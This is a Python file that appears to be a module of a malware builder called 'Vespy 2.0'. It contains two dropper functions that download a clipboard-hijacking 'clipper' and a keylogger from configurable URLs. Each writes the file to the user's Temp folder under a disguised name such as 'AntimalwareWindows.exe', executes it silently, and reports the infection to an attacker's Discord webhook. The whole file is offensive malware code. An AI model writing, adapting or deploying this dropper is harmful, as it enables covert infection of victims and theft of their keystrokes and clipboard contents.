import subprocess
from requests import get
from threading import Thread
from getpass import getuser;user=getuser()
from discord_webhook import DiscordWebhook, DiscordEmbed
from time import sleep
def cl33pperdr0p():
        try:
            PAPA=""
            if PAPA == "":
                 pass
            else:
                while True:
                    try:
                        PAPA=get(PAPA).content
                        open(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\WinProcess.exe","wb").write(PAPA)
                        break
                    except:
                        sleep(5)
                webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                embed = DiscordEmbed(title=f"User : ``{user}``", description=f"Successfully Dropped Clipper in PC", color='4300d1')
                embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                embed.set_footer(text='Vespy 2.0 | by : vesper')
                embed.set_timestamp()
                webhook.add_embed(embed)
                webhook.execute()
                subprocess.run([f"C:\\Users\\{user}\\AppData\\Local\\Temp\\WinProcess.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
def k3yL0ggrDr0p():
        try:
            MAMA=""
            if MAMA == "":
                 pass
            else:
                while True:
                    try:
                        MAMA=get(MAMA).content
                        open(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\AntimalwareWindows.exe","wb").write(MAMA)
                        break
                    except:
                        sleep(5)
                webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                embed = DiscordEmbed(title=f"User : ``{user}``", description=f"Successfully Dropped Keylogger in PC", color='4300d1')
                embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                embed.set_footer(text='Vespy 2.0 | by : vesper')
                embed.set_timestamp()
                webhook.add_embed(embed)
                webhook.execute()
                subprocess.run([f"C:\\Users\\{user}\\AppData\\Local\\Temp\\AntimalwareWindows.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
Thread(target=cl33pperdr0p).start()
Thread(target=k3yL0ggrDr0p).start()
